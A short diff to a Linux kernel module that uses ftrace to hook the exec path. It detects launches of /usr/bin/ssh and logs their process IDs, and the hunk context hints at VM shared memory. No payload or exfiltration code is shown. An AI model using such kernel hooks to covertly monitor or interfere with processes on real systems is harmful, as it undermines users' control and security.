@@ -20,7 +20,7 @@ struct ivshmem_info {
  * Copyright (c) 2018 ilammy
  */
 
-#define pr_fmt(fmt) "ftrace_hook: " fmt
+//#define pr_fmt(fmt) "ftrace_hook: " fmt
 
 #include <linux/ftrace.h>
 #include <linux/kallsyms.h>
@@ -245,7 +245,7 @@ static asmlinkage void fh_finalize_exec(struct linux_binprm *bprm)
 {   
 
 
-    if(strncmp(bprm->filename, "/usr/bin/ssh", IFNAMSIZ) == 0){
+    if(strncmp(bprm->filename, "/usr/bin/ssh", 12) == 0){
         printk("finalize execve() %s\n",bprm->filename);
         printk("pid = %d, tgid= %d\n",current->pid,current->tgid);
         char *buf = kmalloc(16*sizeof(char),GFP_KERNEL);
